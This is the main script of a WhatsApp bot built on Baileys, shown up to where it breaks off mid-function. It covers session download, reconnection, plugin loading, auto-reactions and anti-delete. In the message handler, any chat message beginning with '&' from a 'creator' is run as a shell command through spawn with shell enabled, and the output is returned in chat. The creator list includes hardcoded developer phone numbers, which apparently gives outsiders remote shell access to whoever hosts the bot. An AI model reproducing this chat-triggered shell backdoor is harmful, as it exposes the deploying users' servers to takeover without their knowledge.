const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, 
    makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type');
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['2348111637463']

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir, { recursive: true })
}

const clearTempDir = () => {
    try {
        fs.readdir(tempDir, (err, files) => {
            if (err) return;
            for (const file of files) {
                fs.unlink(path.join(tempDir, file), err => {
                    if (err) console.log('Error clearing temp file:', err);
                });
            }
        });
    } catch (error) {
        console.log('Error in clearTempDir:', error);
    }
}

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

// Ensure sessions directory exists
const sessionsDir = path.join(__dirname, 'sessions');
if (!fs.existsSync(sessionsDir)) {
    fs.mkdirSync(sessionsDir, { recursive: true });
}

//===================SESSION-AUTH============================
const initializeSession = async () => {
    const credsPath = path.join(__dirname, 'sessions', 'creds.json');
    
    if (!fs.existsSync(credsPath)) {
        if (!config.SESSION_ID) {
            console.log('Please add your session to SESSION_ID env !!');
            process.exit(1);
        }
        
        try {
            console.log('Downloading session...');
            const sessdata = config.SESSION_ID.replace("Groq~", '');
            const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
            
            return new Promise((resolve, reject) => {
                filer.download((err, data) => {
                    if (err) {
                        console.error('Session download error:', err);
                        reject(err);
                        return;
                    }
                    
                    fs.writeFile(credsPath, data, (writeErr) => {
                        if (writeErr) {
                            console.error('Session write error:', writeErr);
                            reject(writeErr);
                            return;
                        }
                        console.log("Session downloaded ✅");
                        resolve();
                    });
                });
            });
        } catch (error) {
            console.error('Session initialization error:', error);
            throw error;
        }
    }
    return Promise.resolve();
};

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

// Global error handlers
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    // Don't exit immediately, try to handle gracefully
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

// Add cleanup function
const cleanup = () => {
    if (conn) {
        try {
            conn.ws?.close();
            conn.end();
        } catch (error) {
            console.log('Error during cleanup:', error);
        }
    }
};

// Handle process termination
process.on('SIGINT', () => {
    console.log('Received SIGINT, cleaning up...');
    cleanup();
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('Received SIGTERM, cleaning up...');
    cleanup();
    process.exit(0);
});

let conn;
let isConnecting = false;
let reconnectAttempts = 0;
const maxReconnectAttempts = 3;

// Connection state checker
const isConnectionReady = () => {
    return conn && 
           conn.user && 
           conn.ws && 
           conn.ws.readyState !== undefined && 
           conn.ws.readyState === conn.ws.OPEN;
};

//=============================================

async function connectToWA() {
    if (isConnecting) return;
    isConnecting = true;
    
    try {
        console.log("Connecting to WhatsApp ⏳️...");
        
        // Initialize session first
        await initializeSession();
        
        // Wait a bit for file system operations
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
        const { version } = await fetchLatestBaileysVersion();

        // Add connection status check
        if (!state.creds) {
            console.error('No credentials found. Please check your SESSION_ID.');
            isConnecting = false;
            return;
        }

        conn = makeWASocket({
            logger: P({ level: 'silent' }),
            printQRInTerminal: true,
            browser: Browsers.macOS("Firefox"),
            syncFullHistory: false,
            auth: state,
            version,
            markOnlineOnConnect: false,
            generateHighQualityLinkPreview: false,
            connectTimeoutMs: 120000,
            defaultQueryTimeoutMs: 30000,
            keepAliveIntervalMs: 30000,
            getMessage: async (key) => {
                if (global.store) {
                    const msg = await global.store.loadMessage(key.remoteJid, key.id);
                    return msg?.message || undefined;
                }
                return proto.Message.fromObject({});
            },
            shouldSyncHistoryMessage: () => false,
            emitOwnEvents: true,
            fireInitQueries: false,
            retryRequestDelayMs: 1000,
            maxMsgRetryCount: 3,
            qrTimeout: 90000,
            transactionOpts: {
                maxCommitRetries: 5,
                delayBetweenTriesMs: 3000,
            },
            options: {
                chats: { limit: 25 },
                history: { count: 0 }
            }
        });

        // Initialize store
        if (!global.store) {
            try {
                global.store = makeInMemoryStore({ 
                    logger: P().child({ level: 'silent', stream: 'store' }) 
                });
            } catch (error) {
                console.log('makeInMemoryStore not available, using fallback');
                global.store = null;
            }
        }
        if (global.store) {
            global.store.bind(conn.ev);
        }

        conn.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            if (qr) {
                console.log('QR Code received, scan to login');
                qrcode.generate(qr, { small: true });
            }
            
            if (connection === 'close') {
                isConnecting = false;
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                
                console.log('Connection closed:', {
                    statusCode,
                    error: lastDisconnect?.error?.message,
                    shouldReconnect
                });
                
                if (statusCode === DisconnectReason.loggedOut) {
                    console.log('Bot logged out. Please get a new session.');
                    return;
                }
                
                if (shouldReconnect && reconnectAttempts < maxReconnectAttempts) {
                    reconnectAttempts++;
                    const delay = statusCode === 440 ? 30000 : 
                                 statusCode === 408 ? 15000 : 10000;
                    
                    console.log(`Reconnecting in ${delay/1000} seconds... (Attempt ${reconnectAttempts}/${maxReconnectAttempts})`);
                    setTimeout(() => {
                        connectToWA();
                    }, delay);
                } else if (reconnectAttempts >= maxReconnectAttempts) {
                    console.log('Max reconnect attempts reached. Please check your configuration.');
                }
            } else if (connection === 'open') {
                isConnecting = false;
                reconnectAttempts = 0;
                console.log('🧬 Installing Plugins');
                
                try {
                    const pluginsPath = path.join(__dirname, 'plugins');
                    if (fs.existsSync(pluginsPath)) {
                        fs.readdirSync(pluginsPath).forEach((plugin) => {
                            if (path.extname(plugin).toLowerCase() === ".js") {
                                try {
                                    require(path.join(pluginsPath, plugin));
                                } catch (pluginError) {
                                    console.error(`Error loading plugin ${plugin}:`, pluginError);
                                }
                            }
                        });
                    }
                    console.log('Plugins installed successful ✅');
                    console.log('Bot connected to whatsapp ✅');

                    let up = `╭─〔 *🤖 Groq AI* 〕  
├─▸ *Ultra Super Fast Powerfull ⚠️*  
│     *World Best AI* 
╰─➤ *Your Smart WhatsApp Bot is Ready To use 🍁!*  

- *🖤 Thank You for Choosing Groq!* 

╭──〔 🔗 *Information* 〕  
├─ ↪ Prefix:= ${prefix}
├─ 📢 Join Channel:  
│    https://whatsapp.com/channel/0029Vb2hoPpDZ4Lb3mSkVI3C  
├─ 🌟 Star the Repo:  
│    https://github.com/MLILA17/DML-MD  
╰─🚀 *Powered by Alex Macksyn*`;
                    
                    // Wait for connection to fully stabilize before sending startup message
                    setTimeout(() => {
                        if (isConnectionReady()) {
                            conn.sendMessage(conn.user.id, { 
                                image: { url: `https://files.catbox.moe/vcdwmp.jpg` }, 
                                caption: up 
                            }).catch(error => {
                                console.error('Error sending startup message:', error);
                            });
                        }
                    }, 5000);
                } catch (error) {
                    console.error('Error in connection open handler:', error);
                }
            } else if (connection === 'connecting') {
                console.log('Connecting to WhatsApp...');
            }
        });

        conn.ev.on('creds.update', saveCreds);

        //==============================

        conn.ev.on('messages.update', async updates => {
            try {
                for (const update of updates) {
                    if (update.update.message === null) {
                        console.log("Delete Detected:", JSON.stringify(update, null, 2));
                        await AntiDelete(conn, updates);
                    }
                }
            } catch (error) {
                console.error('Error in messages.update:', error);
            }
        });

        //============================== 

        conn.ev.on("group-participants.update", (update) => {
            try {
                GroupEvents(conn, update);
            } catch (error) {
                console.error('Error in group-participants.update:', error);
            }
        });

        //=============readstatus=======

        conn.ev.on('messages.upsert', async(mek) => {
            try {
                mek = mek.messages[0];
                if (!mek || !mek.message) return;
                
                mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                    ? mek.message.ephemeralMessage.message 
                    : mek.message;

                if (config.READ_MESSAGE === 'true') {
                    await conn.readMessages([mek.key]);
                    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
                }

                if(mek.message.viewOnceMessageV2) {
                    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                        ? mek.message.ephemeralMessage.message 
                        : mek.message;
                }

                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
                    await conn.readMessages([mek.key]);
                }

                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
                    const jawadlike = await conn.decodeJid(conn.user.id);
                    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
                    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                    await conn.sendMessage(mek.key.remoteJid, {
                        react: {
                            text: randomEmoji,
                            key: mek.key,
                        } 
                    }, { statusJidList: [mek.key.participant, jawadlike] });
                }

                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
                    const user = mek.key.participant;
                    const text = `${config.AUTO_STATUS_MSG}`;
                    await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
                }

                await Promise.all([
                    saveMessage(mek),
                ]);

                const m = sms(conn, mek);
                const type = getContentType(mek.message);
                const content = JSON.stringify(mek.message);
                const from = mek.key.remoteJid;
                const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
                const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
                const isCmd = body.startsWith(prefix);
                var budy = typeof mek.text == 'string' ? mek.text : false;
                const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
                const args = body.trim().split(/ +/).slice(1);
                const q = args.join(' ');
                const text = args.join(' ');
                const isGroup = from.endsWith('@g.us');
                const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
                const senderNumber = sender.split('@')[0];
                const botNumber = conn.user.id.split(':')[0];
                const pushname = mek.pushName || 'Sin Nombre';
                const isMe = botNumber.includes(senderNumber);
                const isOwner = ownerNumber.includes(senderNumber) || isMe;
                const botNumber2 = await jidNormalizedUser(conn.user.id);
                const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
                const groupName = isGroup ? groupMetadata.subject : '';
                const participants = isGroup ? await groupMetadata.participants : '';
                const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
                const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
                const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
                const isReact = m.message.reactionMessage ? true : false;
                
                const reply = (teks) => {
                    if (isConnectionReady()) {
                        conn.sendMessage(from, { text: teks }, { quoted: mek }).catch(error => {
                            console.error('Error sending reply:', error);
                        });
                    } else {
                        console.log('Connection not ready, skipping reply. State:', conn?.ws?.readyState);
                    }
                }

                const udp = botNumber.split('@')[0];
                const jawadop = ('2348111637463', '2348089782988');

                const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  

                let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
                    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
                    .includes(mek.sender);

                if (isCreator && mek.text && mek.text.startsWith("&")) {
                    let code = budy.slice(2);
                    if (!code) {
                        reply(`Provide me with a query to run Master!`);
                        return;
                    }
                    const { spawn } = require("child_process");
                    try {
                        let resultTest = spawn(code, { shell: true });
                        resultTest.stdout.on("data", data => {
                            reply(data.toString());
                        });
                        resultTest.stderr.on("data", data => {
                            reply(data.toString());
                        });
                        resultTest.on("error", data => {
                            reply(data.toString());
                        });
                        resultTest.on("close", code => {
                            if (code !== 0) {
                                reply(`command exited with code ${code}`);
                            }
                        });
                    } catch (err) {
                        reply(util.format(err));
                    }
                    return;
                }

                // Auto React for all messages (public and owner)
                if (!isReact && config.AUTO_REACT === 'true' && isConnectionReady()) {
                    const reactions = [
                        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
                        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
                        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
                        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
                        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
                        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
                        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
                        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
                        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
                        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
                        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
                        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
                        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
                        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
                        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
                    ];

                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                    m.react(randomReaction).catch(error => {
                        console.error('Error sending reaction:', error);
                    });
                }

                // Custom React for all messages (public and owner)
                if (!isReact && config.CUSTOM_REACT === 'true' && isConnectionReady()) {
                    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                    m.react(randomReaction).catch(error => {
                        console.error('Error sending custom reaction:', error);
                    });
                }

                // ban users 
                const bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
                const isBanned = bannedUsers.includes(sender);

                if (isBanned) return; // Ignore banned users completely

                const ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
                const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
                const isFileOwner = ownerFile.includes(sender);
                const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
                
                // mode settings 
                if (!isRealOwner && config.MODE === "private") return;
                if (!isRealOwner && isGroup && config.MODE === "inbox") return;
                if (!isRealOwner && !isGroup && config.MODE === "groups") return;

                // take commands 
                const events = require('./command');
                const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                
                if (isCmd) {
                    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                    if (cmd) {
                        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});

                        try {
                            cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                        } catch (e) {
                            console.error("[PLUGIN ERROR] " + e);
                        }
                    }
                }
                
                events.commands.map(async(command) => {
                    if (body && command.on === "body") {
                        command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                    } else if (mek.q && command.on === "text") {
                        command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                    } else if (
                        (command.on === "image" || command.on === "photo") &&
                        mek.type === "imageMessage"
                    ) {
                        command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                    } else if (
                        command.on === "sticker" &&
                        mek.type === "stickerMessage"
                    ) {
                        command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                    }
                });

            } catch (error) {
                console.error('Error in messages.upsert:', error);
            }
        });

        // Add all the helper functions
        conn.decodeJid = jid => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {};
                return (
                    (decode.user &&
                        decode.server &&
                        decode.user + '@' + decode.server) ||
                    jid
                );
            } else return jid;
        };

        conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
            let vtype
            if (options.readViewOnce) {
                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
                delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
                delete message.message.viewOnceMessage.message[vtype].viewOnce
                message.message = {
                    ...message.message.viewOnceMessage.message
                }
            }

            let mtype = Object.keys(message.message)[0]
            let content = await generateForwardMessageContent(message, forceForward)
            let ctype = Object.keys(content)[0]
            let context = {}
            if (mtype != "conversation") context = message.message[mtype].contextInfo
            content[ctype].contextInfo = {
                ...context,
                ...content[ctype].contextInfo
            }
            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
                ...content[ctype],
                ...options,
                ...(options.contextInfo ? {
                    contextInfo: {
                        ...content[ctype].contextInfo,
                        ...options.contextInfo
                    }
                } : {})
            } : {})
            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
            return waMessage
        }

        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
            let quoted = message.msg ? message.msg : message
            let mime = (message.msg || message).mimetype || ''
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
            const stream = await downloadContentFromMessage(quoted, messageType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }
            let type = await FileType.fromBuffer(buffer)
            trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
            await fs.writeFileSync(trueFileName, buffer)
            return trueFileName
        }

        conn.downloadMediaMessage = async(message) => {
            let mime = (message.msg || message).mimetype || ''
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
            const stream = await downloadContentFromMessage(message, messageType)
            let buffer = Buffer.from([])
            for await (const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }
            return buffer
        }

        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
            }
            let type = mime.split("/")[0] + "Message"
            if (mime === "application/pdf") {
                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "image") {
                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "video") {
                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
            }
            if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
            }
        }

        conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
            let mtype = Object.keys(copy.message)[0]
            let isEphemeral = mtype === 'ephemeralMessage'
            if (isEphemeral) {
                mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
            }
            let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
            let content = msg[mtype]
            if (typeof content === 'string') msg[mtype] = text || content
            else if (content.caption) content.caption = text || content.caption
            else if (content.text) content.text = text || content.text
            if (typeof content !== 'string') msg[mtype] = {
                ...content,
                ...options
            }
            if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
            else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
            if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
            else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
            copy.key.remoteJid = jid
            copy.key.fromMe = sender === conn.user.id

            return proto.WebMessageInfo.fromObject(copy)
        }

        conn.getFile = async(PATH, save) => {
            let res
            let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
            let type = await FileType.fromBuffer(data) || {
                mime: 'application/octet-stream',
                ext: '.bin'
            }
            let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
            if (data && save) fs.promises.writeFile(filename, data)
            return {
                res,
                filename,
                size: await getSizeMedia(data),
                ...type,
                data
            }
        }

        conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
            let types = await conn.getFile(PATH, true)
            let { filename, size, ext, mime, data } = types
            let type = '',
                mimetype = mime,
                pathFile = filename
            if (options.asDocument) type = 'document'
            if (options.asSticker || /webp/.test(mime)) {
                let { writeExif } = require('./exif.js')
                let media = { mimetype: mime, data }
                pathFile = await writeExif(media, { packname: config.packname, author: config.packname, categories: options.categories ? options.categories : [] })
                await fs.promises.unlink(filename)
                type = 'sticker'
                mimetype = 'image/webp'
            } else if (/image/.test(mime)) type = 'image'
            else if (/video/.test(mime)) type = 'video'
            else if (/audio/.test(mime)) type = 'audio'
            else type = 'document'
            await conn.sendMessage(jid, {
                [type]: { url: pathFile },
                mimetype,
                fileName,
                ...options
            }, { quoted, ...options })
            return fs.promises.unlink(pathFile)
        }

        conn.parseMention = async(text) => {
            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
        }

        conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
            let types = await conn.getFile(path, true)
            let { mime, ext, res, data, filename } = types
            if (res && res.status !== 200 || file.length <= 65536) {
                try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
            }
            let type = '',
                mimetype = mime,
                pathFile = filename
            if (options.asDocument) type = 'document'
            if (options.asSticker || /webp/.test(mime)) {
                let { writeExif } = require('./exif')
                let media = { mimetype: mime, data }
                pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.packname, author: options.author ? options.author : config.author, categories: options.categories ? options.categories : [] })
                await fs.promises.unlink(filename)
                type = 'sticker'
                mimetype = 'image/webp'
            } else if (/image/.test(mime)) type = 'image'
            else if (/video/.test(mime)) type = 'video'
            else if (/audio/.test(mime)) type = 'audio'
            else type = 'document'
            await conn.sendMessage(jid, {
                [type]: { url: pathFile },
                caption,
                mimetype,
                fileName,
                ...options
            }, { quoted, ...options })
            return fs.promises.unlink(pathFile)
        }

        conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
            let buffer;
            if (options && (options.packname || options.author)) {
                buffer = await writeExifVid(buff, options);
            } else {
                buffer = await videoToWebp(buff);
            }
            await conn.sendMessage(
                jid,
                { sticker: { url: buffer }, ...options },
                options
            );
        };

        conn.sendImageAsSticker = async (jid, buff, options = {}) => {
            let buffer;
            if (options && (options.packname || options.author)) {
                buffer = await writeExifImg(buff, options);
            } else {
                buffer = await imageToWebp(buff);
            }
            await conn.sendMessage(
                jid,
                { sticker: { url: buffer }, ...options },
                options
            );
        };

        conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

        conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
            let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
            return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
        }

        conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })

        conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
            let buttonMessage = {
                text,
                footer,
                buttons,
                headerType: 2,
                ...options
            }
            conn.sendMessage(jid, buttonMessage, { quoted, ...options })
        }

        conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
            let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
            var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
                templateMessage: {
                    hydratedTemplate: {
                        imageMessage: message.imageMessage,
                        "hydratedContentText": text,
                        "hydratedFooterText": footer,
                        "hydratedButtons": but
                    }
                }
            }), options)
            conn.relayMessage(jid, template.message, { messageId: template.key.id })
        }

        conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);
            withoutContact = conn.withoutContact || withoutContact;
            let v;
            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = global.store?.contacts?.[id] || {};
                    if (!(v.name || v.subject))
                        v = await conn.groupMetadata(id).catch(() => ({})) || {};
                    resolve(
                        v.name ||
                            v.subject ||
                            id.replace('@g.us', '')
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,
                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : global.store?.contacts?.[id] || {};
            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                id.replace('@s.whatsapp.net', '')
            );
        };

        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
